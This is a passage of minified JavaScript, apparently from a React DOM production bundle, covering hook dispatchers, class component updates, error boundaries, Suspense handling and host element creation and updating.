a=n.lastRenderedState,l=i(a,t);if(r.hasEagerState=!0,r.eagerState=l,Xe(l,a)){var o=n.interleaved;o===null?(r.next=r,Il(n)):(r.next=o.next,o.next=r),n.interleaved=r;return}}catch{}finally{}t=gp(e,n,r,s),t!==null&&(r=we(),Ye(t,e,s,r),Dp(t,n,s))}}function Ip(e){var n=e.alternate;return e===X||n!==null&&n===X}function zp(e,n){ds=Yr=!0;var t=e.pending;t===null?n.next=n:(n.next=t.next,t.next=n),e.pending=n}function Dp(e,n,t){if(t&4194240){var s=n.lanes;s&=e.pendingLanes,t|=s,n.lanes=t,bl(e,t)}}var Xr={readContext:Fe,useCallback:de,useContext:de,useEffect:de,useImperativeHandle:de,useInsertionEffect:de,useLayoutEffect:de,useMemo:de,useReducer:de,useRef:de,useState:de,useDebugValue:de,useDeferredValue:de,useTransition:de,useMutableSource:de,useSyncExternalStore:de,useId:de,unstable_isNewReconciler:!1},Zf={readContext:Fe,useCallback:function(e,n){return Ze().memoizedState=[e,n===void 0?null:n],e},useContext:Fe,useEffect:sc,useImperativeHandle:function(e,n,t){return t=t!=null?t.concat([e]):null,xr(4194308,4,Ap.bind(null,n,e),t)},useLayoutEffect:function(e,n){return xr(4194308,4,e,n)},useInsertionEffect:function(e,n){return xr(4,2,e,n)},useMemo:function(e,n){var t=Ze();return n=n===void 0?null:n,e=e(),t.memoizedState=[e,n],e},useReducer:function(e,n,t){var s=Ze();return n=t!==void 0?t(n):n,s.memoizedState=s.baseState=n,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:e,lastRenderedState:n},s.queue=e,e=e.dispatch=Kf.bind(null,X,e),[s.memoizedState,e]},useRef:function(e){var n=Ze();return e={current:e},n.memoizedState=e},useState:tc,useDebugValue:Wl,useDeferredValue:function(e){return Ze().memoizedState=e},useTransition:function(){var e=tc(!1),n=e[0];return e=Xf.bind(null,e[1]),Ze().memoizedState=e,[n,e]},useMutableSource:function(){},useSyncExternalStore:function(e,n,t){var s=X,r=Ze();if(q){if(t===void 0)throw Error(A(407));t=t()}else{if(t=n(),ie===null)throw Error(A(349));st&30||bp(s,n,t)}r.memoizedState=t;var i={value:t,getSnapshot:n};return r.queue=i,sc(Sp.bind(null,s,i,e),[e]),s.flags|=2048,Ns(9,xp.bind(null,s,i,t,n),void 0,null),t},useId:function(){var e=Ze(),n=ie.identifierPrefix;if(q){var t=un,s=cn;t=(s&~(1<<32-qe(s)-1)).toString(32)+t,n=":"+n+"R"+t,t=As++,0<t&&(n+="H"+t.toString(32)),n+=":"}else t=Yf++,n=":"+n+"r"+t.toString(32)+":";return e.memoizedState=n},unstable_isNewReconciler:!1},Jf={readContext:Fe,useCallback:Np,useContext:Fe,useEffect:Vl,useImperativeHandle:Lp,useInsertionEffect:Cp,useLayoutEffect:Pp,useMemo:Rp,useReducer:Xi,useRef:Tp,useState:function(){return Xi(Ls)},useDebugValue:Wl,useDeferredValue:function(e){var n=Ue();return Op(n,te.memoizedState,e)},useTransition:function(){var e=Xi(Ls)[0],n=Ue().memoizedState;return[e,n]},useMutableSource:wp,useSyncExternalStore:kp,useId:Mp,unstable_isNewReconciler:!1},em={readContext:Fe,useCallback:Np,useContext:Fe,useEffect:Vl,useImperativeHandle:Lp,useInsertionEffect:Cp,useLayoutEffect:Pp,useMemo:Rp,useReducer:Ki,useRef:Tp,useState:function(){return Ki(Ls)},useDebugValue:Wl,useDeferredValue:function(e){var n=Ue();return te===null?n.memoizedState=e:Op(n,te.memoizedState,e)},useTransition:function(){var e=Ki(Ls)[0],n=Ue().memoizedState;return[e,n]},useMutableSource:wp,useSyncExternalStore:kp,useId:Mp,unstable_isNewReconciler:!1};function Ve(e,n){if(e&&e.defaultProps){n=K({},n),e=e.defaultProps;for(var t in e)n[t]===void 0&&(n[t]=e[t]);return n}return n}function Ia(e,n,t,s){n=e.memoizedState,t=t(s,n),t=t==null?n:K({},n,t),e.memoizedState=t,e.lanes===0&&(e.updateQueue.baseState=t)}var gi={isMounted:function(e){return(e=e._reactInternals)?ot(e)===e:!1},enqueueSetState:function(e,n,t){e=e._reactInternals;var s=we(),r=zn(e),i=dn(s,r);i.payload=n,t!=null&&(i.callback=t),n=Mn(e,i,r),n!==null&&(Ye(n,e,r,s),kr(n,e,r))},enqueueReplaceState:function(e,n,t){e=e._reactInternals;var s=we(),r=zn(e),i=dn(s,r);i.tag=1,i.payload=n,t!=null&&(i.callback=t),n=Mn(e,i,r),n!==null&&(Ye(n,e,r,s),kr(n,e,r))},enqueueForceUpdate:function(e,n){e=e._reactInternals;var t=we(),s=zn(e),r=dn(t,s);r.tag=2,n!=null&&(r.callback=n),n=Mn(e,r,s),n!==null&&(Ye(n,e,s,t),kr(n,e,s))}};function rc(e,n,t,s,r,i,a){return e=e.stateNode,typeof e.shouldComponentUpdate=="function"?e.shouldComponentUpdate(s,i,a):n.prototype&&n.prototype.isPureReactComponent?!Ss(t,s)||!Ss(r,i):!0}function jp(e,n,t){var s=!1,r=Fn,i=n.contextType;return typeof i=="object"&&i!==null?i=Fe(i):(r=Te(n)?nt:me.current,s=n.contextTypes,i=(s=s!=null)?Ot(e,r):Fn),n=new n(t,i),e.memoizedState=n.state!==null&&n.state!==void 0?n.state:null,n.updater=gi,e.stateNode=n,n._reactInternals=e,s&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=r,e.__reactInternalMemoizedMaskedChildContext=i),n}function ic(e,n,t,s){e=n.state,typeof n.componentWillReceiveProps=="function"&&n.componentWillReceiveProps(t,s),typeof n.UNSAFE_componentWillReceiveProps=="function"&&n.UNSAFE_componentWillReceiveProps(t,s),n.state!==e&&gi.enqueueReplaceState(n,n.state,null)}function za(e,n,t,s){var r=e.stateNode;r.props=t,r.state=e.memoizedState,r.refs={},zl(e);var i=n.contextType;typeof i=="object"&&i!==null?r.context=Fe(i):(i=Te(n)?nt:me.current,r.context=Ot(e,i)),r.state=e.memoizedState,i=n.getDerivedStateFromProps,typeof i=="function"&&(Ia(e,n,i,t),r.state=e.memoizedState),typeof n.getDerivedStateFromProps=="function"||typeof r.getSnapshotBeforeUpdate=="function"||typeof r.UNSAFE_componentWillMount!="function"&&typeof r.componentWillMount!="function"||(n=r.state,typeof r.componentWillMount=="function"&&r.componentWillMount(),typeof r.UNSAFE_componentWillMount=="function"&&r.UNSAFE_componentWillMount(),n!==r.state&&gi.enqueueReplaceState(r,r.state,null),Gr(e,t,r,s),r.state=e.memoizedState),typeof r.componentDidMount=="function"&&(e.flags|=4194308)}function Dt(e,n){try{var t="",s=n;do t+=Ch(s),s=s.return;while(s);var r=t}catch(i){r=`
Error generating stack: `+i.message+`
`+i.stack}return{value:e,source:n,stack:r,digest:null}}function Qi(e,n,t){return{value:e,source:null,stack:t??null,digest:n??null}}function Da(e,n){try{console.error(n.value)}catch(t){setTimeout(function(){throw t})}}var nm=typeof WeakMap=="function"?WeakMap:Map;function Bp(e,n,t){t=dn(-1,t),t.tag=3,t.payload={element:null};var s=n.value;return t.callback=function(){Qr||(Qr=!0,qa=s),Da(e,n)},t}function Fp(e,n,t){t=dn(-1,t),t.tag=3;var s=e.type.getDerivedStateFromError;if(typeof s=="function"){var r=n.value;t.payload=function(){return s(r)},t.callback=function(){Da(e,n)}}var i=e.stateNode;return i!==null&&typeof i.componentDidCatch=="function"&&(t.callback=function(){Da(e,n),typeof s!="function"&&(In===null?In=new Set([this]):In.add(this));var a=n.stack;this.componentDidCatch(n.value,{componentStack:a!==null?a:""})}),t}function ac(e,n,t){var s=e.pingCache;if(s===null){s=e.pingCache=new nm;var r=new Set;s.set(n,r)}else r=s.get(n),r===void 0&&(r=new Set,s.set(n,r));r.has(t)||(r.add(t),e=mm.bind(null,e,n,t),n.then(e,e))}function lc(e){do{var n;if((n=e.tag===13)&&(n=e.memoizedState,n=n!==null?n.dehydrated!==null:!0),n)return e;e=e.return}while(e!==null);return null}function oc(e,n,t,s,r){return e.mode&1?(e.flags|=65536,e.lanes=r,e):(e===n?e.flags|=65536:(e.flags|=128,t.flags|=131072,t.flags&=-52805,t.tag===1&&(t.alternate===null?t.tag=17:(n=dn(-1,1),n.tag=2,Mn(t,n,1))),t.lanes|=1),e)}var tm=vn.ReactCurrentOwner,Se=!1;function ve(e,n,t,s){n.child=e===null?mp(n,null,t,s):It(n,e.child,t,s)}function cc(e,n,t,s,r){t=t.render;var i=n.ref;return Pt(n,r),s=Ul(e,n,t,s,i,r),t=Hl(),e!==null&&!Se?(n.updateQueue=e.updateQueue,n.flags&=-2053,e.lanes&=~r,gn(e,n,r)):(q&&t&&Al(n),n.flags|=1,ve(e,n,s,r),n.child)}function uc(e,n,t,s,r){if(e===null){var i=t.type;return typeof i=="function"&&!Zl(i)&&i.defaultProps===void 0&&t.compare===null&&t.defaultProps===void 0?(n.tag=15,n.type=i,Up(e,n,i,s,r)):(e=Tr(t.type,null,s,n,n.mode,r),e.ref=n.ref,e.return=n,n.child=e)}if(i=e.child,!(e.lanes&r)){var a=i.memoizedProps;if(t=t.compare,t=t!==null?t:Ss,t(a,s)&&e.ref===n.ref)return gn(e,n,r)}return n.flags|=1,e=Dn(i,s),e.ref=n.ref,e.return=n,n.child=e}function Up(e,n,t,s,r){if(e!==null){var i=e.memoizedProps;if(Ss(i,s)&&e.ref===n.ref)if(Se=!1,n.pendingProps=s=i,(e.lanes&r)!==0)e.flags&131072&&(Se=!0);else return n.lanes=e.lanes,gn(e,n,r)}return ja(e,n,t,s,r)}function Hp(e,n,t){var s=n.pendingProps,r=s.children,i=e!==null?e.memoizedState:null;if(s.mode==="hidden")if(!(n.mode&1))n.memoizedState={baseLanes:0,cachePool:null,transitions:null},V(xt,Pe),Pe|=t;else{if(!(t&1073741824))return e=i!==null?i.baseLanes|t:t,n.lanes=n.childLanes=1073741824,n.memoizedState={baseLanes:e,cachePool:null,transitions:null},n.updateQueue=null,V(xt,Pe),Pe|=e,null;n.memoizedState={baseLanes:0,cachePool:null,transitions:null},s=i!==null?i.baseLanes:t,V(xt,Pe),Pe|=s}else i!==null?(s=i.baseLanes|t,n.memoizedState=null):s=t,V(xt,Pe),Pe|=s;return ve(e,n,r,t),n.child}function Vp(e,n){var t=n.ref;(e===null&&t!==null||e!==null&&e.ref!==t)&&(n.flags|=512,n.flags|=2097152)}function ja(e,n,t,s,r){var i=Te(t)?nt:me.current;return i=Ot(n,i),Pt(n,r),t=Ul(e,n,t,s,i,r),s=Hl(),e!==null&&!Se?(n.updateQueue=e.updateQueue,n.flags&=-2053,e.lanes&=~r,gn(e,n,r)):(q&&s&&Al(n),n.flags|=1,ve(e,n,t,r),n.child)}function pc(e,n,t,s,r){if(Te(t)){var i=!0;Ur(n)}else i=!1;if(Pt(n,r),n.stateNode===null)Sr(e,n),jp(n,t,s),za(n,t,s,r),s=!0;else if(e===null){var a=n.stateNode,l=n.memoizedProps;a.props=l;var o=a.context,c=t.contextType;typeof c=="object"&&c!==null?c=Fe(c):(c=Te(t)?nt:me.current,c=Ot(n,c));var u=t.getDerivedStateFromProps,h=typeof u=="function"||typeof a.getSnapshotBeforeUpdate=="function";h||typeof a.UNSAFE_componentWillReceiveProps!="function"&&typeof a.componentWillReceiveProps!="function"||(l!==s||o!==c)&&ic(n,a,s,c),xn=!1;var f=n.memoizedState;a.state=f,Gr(n,s,a,r),o=n.memoizedState,l!==s||f!==o||Ee.current||xn?(typeof u=="function"&&(Ia(n,t,u,s),o=n.memoizedState),(l=xn||rc(n,t,l,s,f,o,c))?(h||typeof a.UNSAFE_componentWillMount!="function"&&typeof a.componentWillMount!="function"||(typeof a.componentWillMount=="function"&&a.componentWillMount(),typeof a.UNSAFE_componentWillMount=="function"&&a.UNSAFE_componentWillMount()),typeof a.componentDidMount=="function"&&(n.flags|=4194308)):(typeof a.componentDidMount=="function"&&(n.flags|=4194308),n.memoizedProps=s,n.memoizedState=o),a.props=s,a.state=o,a.context=c,s=l):(typeof a.componentDidMount=="function"&&(n.flags|=4194308),s=!1)}else{a=n.stateNode,yp(e,n),l=n.memoizedProps,c=n.type===n.elementType?l:Ve(n.type,l),a.props=c,h=n.pendingProps,f=a.context,o=t.contextType,typeof o=="object"&&o!==null?o=Fe(o):(o=Te(t)?nt:me.current,o=Ot(n,o));var v=t.getDerivedStateFromProps;(u=typeof v=="function"||typeof a.getSnapshotBeforeUpdate=="function")||typeof a.UNSAFE_componentWillReceiveProps!="function"&&typeof a.componentWillReceiveProps!="function"||(l!==h||f!==o)&&ic(n,a,s,o),xn=!1,f=n.memoizedState,a.state=f,Gr(n,s,a,r);var b=n.memoizedState;l!==h||f!==b||Ee.current||xn?(typeof v=="function"&&(Ia(n,t,v,s),b=n.memoizedState),(c=xn||rc(n,t,c,s,f,b,o)||!1)?(u||typeof a.UNSAFE_componentWillUpdate!="function"&&typeof a.componentWillUpdate!="function"||(typeof a.componentWillUpdate=="function"&&a.componentWillUpdate(s,b,o),typeof a.UNSAFE_componentWillUpdate=="function"&&a.UNSAFE_componentWillUpdate(s,b,o)),typeof a.componentDidUpdate=="function"&&(n.flags|=4),typeof a.getSnapshotBeforeUpdate=="function"&&(n.flags|=1024)):(typeof a.componentDidUpdate!="function"||l===e.memoizedProps&&f===e.memoizedState||(n.flags|=4),typeof a.getSnapshotBeforeUpdate!="function"||l===e.memoizedProps&&f===e.memoizedState||(n.flags|=1024),n.memoizedProps=s,n.memoizedState=b),a.props=s,a.state=b,a.context=o,s=c):(typeof a.componentDidUpdate!="function"||l===e.memoizedProps&&f===e.memoizedState||(n.flags|=4),typeof a.getSnapshotBeforeUpdate!="function"||l===e.memoizedProps&&f===e.memoizedState||(n.flags|=1024),s=!1)}return Ba(e,n,t,s,i,r)}function Ba(e,n,t,s,r,i){Vp(e,n);var a=(n.flags&128)!==0;if(!s&&!a)return r&&Ko(n,t,!1),gn(e,n,i);s=n.stateNode,tm.current=n;var l=a&&typeof t.getDerivedStateFromError!="function"?null:s.render();return n.flags|=1,e!==null&&a?(n.child=It(n,e.child,null,i),n.child=It(n,null,l,i)):ve(e,n,l,i),n.memoizedState=s.state,r&&Ko(n,t,!0),n.child}function Wp(e){var n=e.stateNode;n.pendingContext?Xo(e,n.pendingContext,n.pendingContext!==n.context):n.context&&Xo(e,n.context,!1),Dl(e,n.containerInfo)}function dc(e,n,t,s,r){return Mt(),Nl(r),n.flags|=256,ve(e,n,t,s),n.child}var Fa={dehydrated:null,treeContext:null,retryLane:0};function Ua(e){return{baseLanes:e,cachePool:null,transitions:null}}function $p(e,n,t){var s=n.pendingProps,r=Y.current,i=!1,a=(n.flags&128)!==0,l;if((l=a)||(l=e!==null&&e.memoizedState===null?!1:(r&2)!==0),l?(i=!0,n.flags&=-129):(e===null||e.memoizedState!==null)&&(r|=1),V(Y,r&1),e===null)return Oa(n),e=n.memoizedState,e!==null&&(e=e.dehydrated,e!==null)?(n.mode&1?e.data==="$!"?n.lanes=8:n.lanes=1073741824:n.lanes=1,null):(a=s.children,e=s.fallback,i?(s=n.mode,i=n.child,a={mode:"hidden",children:a},!(s&1)&&i!==null?(i.childLanes=0,i.pendingProps=a):i=wi(a,s,0,null),e=Jn(e,s,t,null),i.return=n,e.return=n,i.sibling=e,n.child=i,n.child.memoizedState=Ua(t),n.memoizedState=Fa,e):$l(n,a));if(r=e.memoizedState,r!==null&&(l=r.dehydrated,l!==null))return sm(e,n,a,s,l,r,t);if(i){i=s.fallback,a=n.mode,r=e.child,l=r.sibling;var o={mode:"hidden",children:s.children};return!(a&1)&&n.child!==r?(s=n.child,s.childLanes=0,s.pendingProps=o,n.deletions=null):(s=Dn(r,o),s.subtreeFlags=r.subtreeFlags&14680064),l!==null?i=Dn(l,i):(i=Jn(i,a,t,null),i.flags|=2),i.return=n,s.return=n,s.sibling=i,n.child=s,s=i,i=n.child,a=e.child.memoizedState,a=a===null?Ua(t):{baseLanes:a.baseLanes|t,cachePool:null,transitions:a.transitions},i.memoizedState=a,i.childLanes=e.childLanes&~t,n.memoizedState=Fa,s}return i=e.child,e=i.sibling,s=Dn(i,{mode:"visible",children:s.children}),!(n.mode&1)&&(s.lanes=t),s.return=n,s.sibling=null,e!==null&&(t=n.deletions,t===null?(n.deletions=[e],n.flags|=16):t.push(e)),n.child=s,n.memoizedState=null,s}function $l(e,n){return n=wi({mode:"visible",children:n},e.mode,0,null),n.return=e,e.child=n}function lr(e,n,t,s){return s!==null&&Nl(s),It(n,e.child,null,t),e=$l(n,n.pendingProps.children),e.flags|=2,n.memoizedState=null,e}function sm(e,n,t,s,r,i,a){if(t)return n.flags&256?(n.flags&=-257,s=Qi(Error(A(422))),lr(e,n,a,s)):n.memoizedState!==null?(n.child=e.child,n.flags|=128,null):(i=s.fallback,r=n.mode,s=wi({mode:"visible",children:s.children},r,0,null),i=Jn(i,r,a,null),i.flags|=2,s.return=n,i.return=n,s.sibling=i,n.child=s,n.mode&1&&It(n,e.child,null,a),n.child.memoizedState=Ua(a),n.memoizedState=Fa,i);if(!(n.mode&1))return lr(e,n,a,null);if(r.data==="$!"){if(s=r.nextSibling&&r.nextSibling.dataset,s)var l=s.dgst;return s=l,i=Error(A(419)),s=Qi(i,s,void 0),lr(e,n,a,s)}if(l=(a&e.childLanes)!==0,Se||l){if(s=ie,s!==null){switch(a&-a){case 4:r=2;break;case 16:r=8;break;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:r=32;break;case 536870912:r=268435456;break;default:r=0}r=r&(s.suspendedLanes|a)?0:r,r!==0&&r!==i.retryLane&&(i.retryLane=r,mn(e,r),Ye(s,e,r,-1))}return Ql(),s=Qi(Error(A(421))),lr(e,n,a,s)}return r.data==="$?"?(n.flags|=128,n.child=e.child,n=gm.bind(null,e),r._reactRetry=n,null):(e=i.treeContext,Ae=On(r.nextSibling),Le=n,q=!0,$e=null,e!==null&&(ze[De++]=cn,ze[De++]=un,ze[De++]=tt,cn=e.id,un=e.overflow,tt=n),n=$l(n,s.children),n.flags|=4096,n)}function hc(e,n,t){e.lanes|=n;var s=e.alternate;s!==null&&(s.lanes|=n),Ma(e.return,n,t)}function Zi(e,n,t,s,r){var i=e.memoizedState;i===null?e.memoizedState={isBackwards:n,rendering:null,renderingStartTime:0,last:s,tail:t,tailMode:r}:(i.isBackwards=n,i.rendering=null,i.renderingStartTime=0,i.last=s,i.tail=t,i.tailMode=r)}function Gp(e,n,t){var s=n.pendingProps,r=s.revealOrder,i=s.tail;if(ve(e,n,s.children,t),s=Y.current,s&2)s=s&1|2,n.flags|=128;else{if(e!==null&&e.flags&128)e:for(e=n.child;e!==null;){if(e.tag===13)e.memoizedState!==null&&hc(e,t,n);else if(e.tag===19)hc(e,t,n);else if(e.child!==null){e.child.return=e,e=e.child;continue}if(e===n)break e;for(;e.sibling===null;){if(e.return===null||e.return===n)break e;e=e.return}e.sibling.return=e.return,e=e.sibling}s&=1}if(V(Y,s),!(n.mode&1))n.memoizedState=null;else switch(r){case"forwards":for(t=n.child,r=null;t!==null;)e=t.alternate,e!==null&&qr(e)===null&&(r=t),t=t.sibling;t=r,t===null?(r=n.child,n.child=null):(r=t.sibling,t.sibling=null),Zi(n,!1,r,t,i);break;case"backwards":for(t=null,r=n.child,n.child=null;r!==null;){if(e=r.alternate,e!==null&&qr(e)===null){n.child=r;break}e=r.sibling,r.sibling=t,t=r,r=e}Zi(n,!0,t,null,i);break;case"together":Zi(n,!1,null,null,void 0);break;default:n.memoizedState=null}return n.child}function Sr(e,n){!(n.mode&1)&&e!==null&&(e.alternate=null,n.alternate=null,n.flags|=2)}function gn(e,n,t){if(e!==null&&(n.dependencies=e.dependencies),rt|=n.lanes,!(t&n.childLanes))return null;if(e!==null&&n.child!==e.child)throw Error(A(153));if(n.child!==null){for(e=n.child,t=Dn(e,e.pendingProps),n.child=t,t.return=n;e.sibling!==null;)e=e.sibling,t=t.sibling=Dn(e,e.pendingProps),t.return=n;t.sibling=null}return n.child}function rm(e,n,t){switch(n.tag){case 3:Wp(n),Mt();break;case 5:vp(n);break;case 1:Te(n.type)&&Ur(n);break;case 4:Dl(n,n.stateNode.containerInfo);break;case 10:var s=n.type._context,r=n.memoizedProps.value;V(Wr,s._currentValue),s._currentValue=r;break;case 13:if(s=n.memoizedState,s!==null)return s.dehydrated!==null?(V(Y,Y.current&1),n.flags|=128,null):t&n.child.childLanes?$p(e,n,t):(V(Y,Y.current&1),e=gn(e,n,t),e!==null?e.sibling:null);V(Y,Y.current&1);break;case 19:if(s=(t&n.childLanes)!==0,e.flags&128){if(s)return Gp(e,n,t);n.flags|=128}if(r=n.memoizedState,r!==null&&(r.rendering=null,r.tail=null,r.lastEffect=null),V(Y,Y.current),s)break;return null;case 22:case 23:return n.lanes=0,Hp(e,n,t)}return gn(e,n,t)}var qp,Ha,Yp,Xp;qp=function(e,n){for(var t=n.child;t!==null;){if(t.tag===5||t.tag===6)e.appendChild(t.stateNode);else if(t.tag!==4&&t.child!==null){t.child.return=t,t=t.child;continue}if(t===n)break;for(;t.sibling===null;){if(t.return===null||t.return===n)return;t=t.return}t.sibling.return=t.return,t=t.sibling}};Ha=function(){};Yp=function(e,n,t,s){var r=e.memoizedProps;if(r!==s){e=n.stateNode,Kn(nn.current);var i=null;switch(t){case"input":r=ua(e,r),s=ua(e,s),i=[];break;case"select":r=K({},r,{value:void 0}),s=K({},s,{value:void 0}),i=[];break;case"textarea":r=ha(e,r),s=ha(e,s),i=[];break;default:typeof r.onClick!="function"&&typeof s.onClick=="function"&&(e.onclick=Br)}ma(t,s);var a;t=null;for(c in r)if(!s.hasOwnProperty(c)&&r.hasOwnProperty(c)&&r[c]!=null)if(c==="style"){var l=r[c];for(a in l)l.hasOwnProperty(a)&&(t||(t={}),t[a]="")}else c!=="dangerouslySetInnerHTML"&&c!=="children"&&c!=="suppressContentEditableWarning"&&c!=="suppressHydrationWarning"&&c!=="autoFocus"&&(gs.hasOwnProperty(c)?i||(i=[]):(i=i||[]).push(c,null));for(c in s){var o=s[c];if(l=r!=null?r[c]:void 0,s.hasOwnProperty(c)&&o!==l&&(o!=null||l!=null))if(c==="style")if(l){for(a in l)!l.hasOwnProperty(a)||o&&o.hasOwnProperty(a)||(t||(t={}),t[a]="");for(a in o)o.hasOwnProperty(a)&&l[a]!==o[a]&&(t||(t={}),t[a]=o[a])}else t||(i||(i=[]),i.push(c,t)),t=o;else c==="dangerouslySetInnerHTML"?(o=o?o.__html:void 0,l=l?l.__html:void 0,o!=null&&l!==o&&(i=i||[]).push(c,o)):c==="children"?typeof o!="string"&&typeof o!="number"||(i=i||[]).push(c,""+o):c!=="suppressContentEditableWarning"&&c!=="suppressHydrationWarning"&&(gs.hasOwnProperty(c)?(o!=null&&c==="onScroll"&&$("scroll",e),i||l===o||(i=[])):(i=i||[]).push(c,o))}t&&(i=i||[]).push("style",t);var c=i;(n.updateQueue=c)&&(n.flags|=4)}};Xp=function(e,n,t,s){t!==s&&(n.flags|=4)};function Qt(e,n){if(!q)switch(e.tailMode){case"hidden":n=e.tail;for(var t=null;n!==null;)n.alternate!==null&&(t=n),n=n.sibling;t===null?e.tail=null:t.sibling=null;break;case"collapsed":t=e.tail;for(var s=null;t!==null;)t.alternate!==null&&(s=t),t=t.sibling;s===null?n||e.tail===null?e.tail=null:e.tail.sibling=null:s.sibling=null}}function he(e){var n=e.alternate!==null&&e.alternate.child===e.child,t=0,s=0;if(n)for(var r=e.child;r!==null;)t|=r.lanes|r.childLanes,s|=r.subtreeFlags&14680064,s|=r.flags&14680064,r.return=e,r=r.sibling;else for(r=e.child;r!==null;)t|=r.lanes|r.childLanes,s|=r.subtreeFlags,s|=r.flags,r.return=e,r=r.sibling;return e.subtreeFlags|=s,e.childLanes=t,n}function im(e,n,t){var s=n.pendingProps;switch(Ll(n),n.tag){case 2:case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return he(n),null;case 1:return Te(n.type)&&Fr(),he(n),null;case 3:return s=n.stateNode,zt(),G(Ee),G(me),Bl(),s.pendingContext&&(s.context=s.pendingContext,s.pendingContext=null),(e===null||e.child===null)&&(ir(n)?n.flags|=4:e===null||e.memoizedState.isDehydrated&&!(n.flags&256)||(n.flags|=1024,$e!==null&&(Ka($e),$e=null))),Ha(e,n),he(n),null;case 5:jl(n);var r=Kn(Ps.current);if(t=n.type,e!==null&&n.stateNode!=null)Yp(e,n,t,s,r),e.ref!==n.ref&&(n.flags|=512,n.flags|=2097152);else{if(!s){if(n.stateNode===null)throw Error(A(166));return he(n),null}if(e=Kn(nn.current),ir(n)){s=n.stateNode,t=n.type;var i=n.memoizedProps;switch(s[Je]=n,s[Ts]=i,e=(n.mode&1)!==0,t){case"dialog":$("cancel",s),$("close",s);break;case"iframe":case"object":case"embed":$("load",s);break;case"video":case"audio":for(r=0;r<rs.length;r++)$(rs[r],s);break;case"source":$("error",s);break;case"img":case"image":case"link":$("error",s),$("load",s);break;case"details":$("toggle",s);break;case"input":xo(s,i),$("invalid",s);break;case"select":s._wrapperState={wasMultiple:!!i.multiple},$("invalid",s);break;case"textarea":_o(s,i),$("invalid",s)}ma(t,i),r=null;for(var a in i)if(i.hasOwnProperty(a)){var l=i[a];a==="children"?typeof l=="string"?s.textContent!==l&&(i.suppressHydrationWarning!==!0&&rr(s.textContent,l,e),r=["children",l]):typeof l=="number"&&s.textContent!==""+l&&(i.suppressHydrationWarning!==!0&&rr(s.textContent,l,e),r=["children",""+l]):gs.hasOwnProperty(a)&&l!=null&&a==="onScroll"&&$("scroll",s)}switch(t){case"input":Ks(s),So(s,i,!0);break;case"textarea":Ks(s),Eo(s);break;case"select":case"option":break;default:typeof i.onClick=="function"&&(s.onclick=Br)}s=r,n.updateQueue=s,s!==null&&(n.flags|=4)}else{a=r.nodeType===9?r:r.ownerDocument,e==="http://www.w3.org/1999/xhtml"&&(e=Su(t)),e==="http://www.w3.org/1999/xhtml"?t==="script"?(e=a.createElement("div"),e.innerHTML="<script><\/script>",e=e.removeChild(e.firstChild)):typeof s.is=="string"?e=a.createElement(t,{is:s.is}):(e=a.createElement(t),t==="select"&&(a=e,s.multiple?a.multiple=!0:s.size&&(a.size=s.size))):e=a.createElementNS(e,t),e[Je]=n,e[Ts]=s,qp(e,n,!1,!1),n.stateNode=e;e:{switch(a=ga(t,s),t){case"dialog":$("cancel",e),$("close",e),r=s;break;case"iframe":case"object":case"embed":$("load",e),r=s;break;case"video":case"audio":for(r=0;r<rs.length;r++)$(rs[r],e);r=s;break;case"source":$("error",e),r=s;break;case"img":case"image":case"link":$("error",e),$("load",e),r=s;break;case"details":$("toggle",e),r=s;break;case"input":xo(e,s),r=ua(e,s),$("invalid",e);break;case"option":r=s;break;case"select":e._wrapperState={wasMultiple:!!s.multiple},r=K({},s,{value:void 0}),$("invalid",e);break;case"textarea":_o(e,s),r=ha(e,s),$("invalid",e);break;default:r=s}ma(t,r),l=r;for(i in l)if(l.hasOwnProperty(i)){var o=l[i];i==="style"?Tu(e,o):i==="dangerouslySetInnerHTML"?(o=o?o.__html:void 0,o!=null&&_u(e,o)):i==="children"?typeof o=="string"?(t!=="textarea"||o!=="")&&ys(e,o):typeof o=="number"&&ys(e,""+o):i!=="suppressContentEditableWarning"&&i!=="suppressHydrationWarning"&&i!=="autoFocus"&&(gs.hasOwnProperty(i)?o!=null&&i==="onScroll"&&$("scroll",e):o!=null&&ml(e,i,o,a))}switch(t){case"input":Ks(e),So(e,s,!1);break;case"textarea":Ks(e),Eo(e);break;case"option":s.value!=null&&e.setAttribute("value",""+Bn(s.value));break;case"select":e.multiple=!!s.multiple,i=s.value,i!=null?_t(e,!!s.multiple,i,!1):s.defaultValue!=null&&_t(e,!!s.multiple,s.defaultValue,!0);break;default:typeof r.onClick=="function"&&(e.onclick=Br)}switch(t){case"button":case"input":case"select":case"textarea":s=!!s.autoFocus;break e;case"img":s=!0;break e;default:s=!1}}s&&(n.flags|=4)}n.ref!==null&&(n.flags|=512,n.flags|=2097152)}return he(n),null;case 6:if(e&&n.stateNode!=null)Xp(e,n,e.memoizedProps,s);else{if(typeof s!="string"&&n.stateNode===null)throw Error(A(166));if(t=Kn(Ps.current),Kn(nn.current),ir(n)){if(s=n.stateNode,t=n.memoizedProps,s[Je]=n,(i=s.nodeValue!==t)&&(e=Le,e!==null))switch(e.tag){case 3:rr(s.nodeValue,t,(e.mode&1)!==0);break;case 5:e.memoizedProps.suppressHydrationWarning!==!0&&rr(s.nodeValue,t,(e.mode&1)!==0)}i&&(n.flags|=4)}else s=(t.nodeType===9?t:t.ownerDocument).createTextNode(s),s[Je]=n,n.stateNode=s}return he(n),null;case 13:if(G(Y),s=n.memoizedState,e===null||e.memoizedState!==null&&e.memoizedState.dehydrated!==null){if(q&&Ae!==null&&n.mode&1&&!(n.flags&128))hp(),Mt(),n.flags|=98560,i=!1;else if(i=ir(n),s!==null&&s.dehydrated!==null){if(e===null){if(!i)throw Error(A(318));if(i=n.memoizedState,i=i!==null?i.dehydrated:null,!i)throw Error(A(317));i[Je]=n}else Mt(),!(n.flags&128)&&(n.memoizedState=null),n.flags|=4;he(n),i=!1}else $e!==null&&(Ka($e),$e=null),i=!0;if(!i)return n.flags&65536?n:null}return n.flags&128?(n.lanes=t,n):(s=s!==null,s!==(e!==null&&e.memoizedState!==null)&&s&&(n.child.flags|=8192,n.mode&1&&(e===null||Y.current&1?se===0&&(se=3):Ql())),n.updateQueue!==null&&(n.flags|=4),he(n),null);case 4:return zt(),Ha(e,n),e===null&&_s(n.stateNode.containerInfo),he(n),null;case 10:return Ml(n.type._context),he(n),null;case 17:return Te(n.type)&&Fr(),he(n),null;case 